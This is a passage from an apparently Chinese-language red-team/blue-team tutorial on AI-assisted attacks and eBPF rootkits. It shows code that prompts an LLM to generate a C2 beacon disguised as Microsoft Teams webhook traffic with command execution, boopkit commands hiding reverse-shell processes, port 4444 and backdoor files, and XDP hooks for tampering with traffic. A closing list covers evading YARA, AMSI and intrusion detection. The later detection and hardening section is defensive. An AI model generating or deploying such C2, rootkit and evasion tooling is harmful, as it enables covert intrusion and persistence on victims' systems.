print("[*] 编译后可绕过基于签名的 YARA 规则和 AMSI 检测")
PYEOF

# 3.2 AI 生成 C2 流量模拟（规避 DLP/IDS）
python3 << 'PYEOF'
import openai

# 让 LLM 生成伪装为正常业务流量的 C2 通信代码
prompt = """生成一个 Python C2 beacon 客户端，要求:
1. 伪装为 Microsoft Teams Webhook 流量（POST 到 teams.microsoft.com 格式的 URL）
2. 使用 Jitter 随机化 beacon 间隔（60s ± 20%）
3. 数据使用 base64 编码嵌入 JSON 字段（伪装为 Teams 消息内容）
4. TLS 指纹模拟正常浏览器（使用 requests + tls_client）
5. 支持命令执行和文件上传
6. DNS 查询使用 DoH（DNS over HTTPS）避免 DNS 日志

输出: 完整的 Python C2 beacon 代码，注释为中文。
"""

client = openai.OpenAI()
response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": prompt}],
    temperature=0.3
)

c2_code = response.choices[0].message.content
with open('c2_beacon.py', 'w') as f:
    f.write(c2_code)
print("[+] C2 beacon 代码已生成: c2_beacon.py")
print("[*] 流量伪装为 Teams Webhook，规避 DLP/IDS 检测")
PYEOF

# ============================================================
# 步骤 4：eBPF Rootkit 部署（红队 — 隐蔽持久化）
# ============================================================

# 4.1 eBPF Rootkit 隐藏进程和网络连接
# 使用 Boopkit / TripleCross（2026 eBPF rootkit 工具）

# 部署 eBPF 隐藏程序（隐藏攻击者的 reverse shell 进程）
sudo ./boopkit --iface eth0 \
  --hide-pids 1337,4242 \     # 隐藏指定 PID 的进程
  --hide-port 4444 \           # 隐藏指定端口
  --hide-files "backdoor*"     # 隐藏匹配文件名的文件

# 验证隐藏效果
ps aux | grep 1337              # 进程不可见
ss -tlnp | grep 4444           # 端口不可见
ls /tmp/backdoor*              # 文件不可见
# 但进程实际仍在运行，可正常接收命令

# 4.2 eBPF TC hook 网络流量拦截
# 在内核网络栈底层拦截/篡改流量（绕过 iptables/netfilter）
bpftool prog load xdp_intercept.o /sys/fs/bpf/xdp_intercept type xdp
ip link set dev eth0 xdpgeneric obj xdp_intercept.o sec xdp
# 现在所有入站流量都经过 eBPF 程序处理，可:
# - 过滤特定 IP 的流量（对安全设备隐藏攻击流量）
# - 篡改 DNS 响应（重定向到攻击者服务器）
# - 注入后门响应（在不打开端口的情况下接收命令）

# 4.3 eBPF 程序自身隐藏
# 修改 bpf_prog_info 结构，使 bpftool prog show 不显示恶意程序
# 通过 fentry/fexit hook 审计函数，过滤特定程序 ID

# ============================================================
# 步骤 5：eBPF Rootkit 检测（蓝队 — 防御视角）
# ============================================================

# 5.1 使用 bpftrace 审计所有 BPF 系统调用
sudo bpftrace -e '
tracepoint:syscalls:sys_enter_bpf {
  @[comm, args.cmd] = count();
}
'
# 监控哪些进程在加载 BPF 程序，异常进程加载 BPF = 可疑

# 5.2 检查 /sys/fs/bpf/ 挂载点异常文件
ls -la /sys/fs/bpf/
# 正常情况下应只有少量 BPF 程序（Cilium、Falco 等）
# 出现未知程序 = 可能是 rootkit

# 5.3 使用 bpftool 列出所有 BPF 程序（检测隐藏程序）
sudo bpftool prog show
sudo bpftool map show
# 对比预期程序列表与实际程序，差异 = 可疑

# 5.4 检查内核 BPF 相关参数
sysctl kernel.unprivileged_bpf_disabled
# 应为 1 或 2（2 = 即使 root 也需 CAP_BPF）
# 如果为 0 = 非特权用户可加载 BPF → 高风险

# 5.5 部署 Tetragon（eBPF 安全运行时）检测 rootkit
# Tetragon 可以监控和阻止异常的 BPF 程序加载
cat > tetragon-policy.yaml << 'YAMLEOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-ebpf-rootkit
spec:
  kprobes:
  - call: "security_bpf_prog_alloc"
    syscall: false
    args:
    - index: 0
      type: "int"
    selectors:
    - matchPIDs:
      - operator: NotIn
        values: ["cilium-agent", "falco", "tetragon"]
      matchActions:
      - action: Sigkill    # 杀死非白名单进程的 BPF 加载尝试
        rateLimit: "1m"
YAMLEOF

# 5.6 检测 eBPF 隐藏的进程（通过 /proc 对比）
# eBPF rootkit 隐藏的进程在 /proc 中不可见
# 但可以通过 /proc/<pid>/sched 或 /proc/<pid>/stack 间接发现
python3 << 'PYEOF'
import os

# 方法 1: 对比 /proc 列表与 /proc/*/sched
proc_visible = set(os.listdir('/proc'))
proc_sched = set()
for pid in range(1, 65536):
    try:
        with open(f'/proc/{pid}/sched') as f:
            first_line = f.readline()
            if first_line:
                proc_sched.add(str(pid))
    except:
        pass

# 差集: 在 sched 中存在但在 /proc 中不可见的 PID = 被 eBPF 隐藏
hidden_pids = proc_sched - proc_visible
if hidden_pids:
    print(f"[!] 发现隐藏进程: {hidden_pids}")
    for pid in hidden_pids:
        with open(f'/proc/{pid}/comm') as f:
            print(f"  PID {pid}: {f.read().strip()}")
else:
    print("[+] 未发现隐藏进程")

# 方法 2: 通过 /proc/*/net/tcp 对比网络连接
# eBPF 隐藏的端口在 ss/netstat 中不可见，但 /proc/net/tcp 仍可见
import re
hidden_ports = set()
with open('/proc/net/tcp') as f:
    for line in f:
        match = re.search(r':([0-9A-F]{4})\s+00000000:0000\s+0A', line)
        if match:
            port = int(match.group(1), 16)
            hidden_ports.add(port)

# 对比 ss 输出
import subprocess
ss_output = subprocess.check_output(['ss', '-tlnH'], text=True)
ss_ports = set()
for line in ss_output.split('\n'):
    match = re.search(r':(\d+)\s', line)
    if match:
        ss_ports.add(int(match.group(1)))

ports_hidden_from_ss = hidden_ports - ss_ports
if ports_hidden_from_ss:
    print(f"[!] ss 中不可见但 /proc/net/tcp 中存在的端口: {ports_hidden_from_ss}")
else:
    print("[+] 未发现隐藏端口")
PYEOF

# 5.7 锁定内核防止 eBPF rootkit 加载
# 方法 1: 禁用非特权 BPF
sudo sysctl -w kernel.unprivileged_bpf_disabled=2

# 方法 2: 启用内核 lockdown 模式
sudo sysctl -w kernel.lockdown=confidentiality
# lockdown=integrity: 阻止 BPF 加载和内核模块加载
# lockdown=confidentiality: 更严格，阻止 /dev/mem, kexec 等

# 方法 3: 使用内核模块签名验证
# 配置内核 CONFIG_BPF_SIGNATURE=y（2026 新特性）
# 只允许签名的 BPF 程序加载
```

**2026 AI 红队 + eBPF 检测绕过技巧**：
- AI 生成的攻击路径分析在本地执行，不产生对目标的网络流量
- AI 决策的横向移动操作使用标准渗透测试工具，命令本身不触发额外告警
- Mimikatz 变体通过 LLM 生成的代码重命名和混淆，绕过基于函数名/字符串的 YARA 规则
- C2 beacon 流量伪装为 Teams Webhook（POST + JSON + base64），混入正常企业通信流量
- eBPF rootkit 在内核态执行，`ps`/`ss`/`netstat` 等用户态工具无法看到被隐藏的进程/端口
- eBPF TC/XDP hook 在网络栈最底层拦截流量，绕过 iptables/netfilter 规则和 NIDS
- 检测对抗: 蓝队需通过 `/proc/*/sched` vs `/proc` 对比、`/proc/net/tcp` vs `ss` 对比、Tetragon 策略执行等手段检测 eBPF rootkit
- 2026 关键防御：`kernel.unprivileged_bpf_disabled=2` + `lockdown=confidentiality` + Tetragon 策略 + BPF 程序签名验证
